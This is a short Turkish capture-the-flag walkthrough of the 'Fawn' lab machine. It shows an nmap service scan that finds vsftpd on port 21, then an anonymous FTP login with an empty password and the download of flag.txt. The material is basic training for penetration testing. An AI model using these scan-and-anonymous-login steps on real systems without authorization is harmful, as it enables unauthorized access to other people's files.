---
glightbox: true
---

# Fawn

!!! info "Target IP Address"

    10.129.25.41

Hedef makine için Nmap taraması gerçekleştir:

```bash
sudo nmap 10.129.25.41 -sV
```

```text title="Output" hl_lines="6"
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-10 22:58 +03
Nmap scan report for 10.129.25.41
Host is up (0.28s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.69 seconds
```

FTP bağlantısı gerçekleştir ve `anonymous` kullanıcısı olarak giriş yap. Parola sorulduğunda boş parola gir:

```bash
ftp 10.129.25.41
```

Aşağıdaki komut ile bayrağı yerel makineye indir:

```text
get flag.txt
```

Aşağıdaki komut ile bayrağı ele geçir:

```bash
cat flag.txt
```
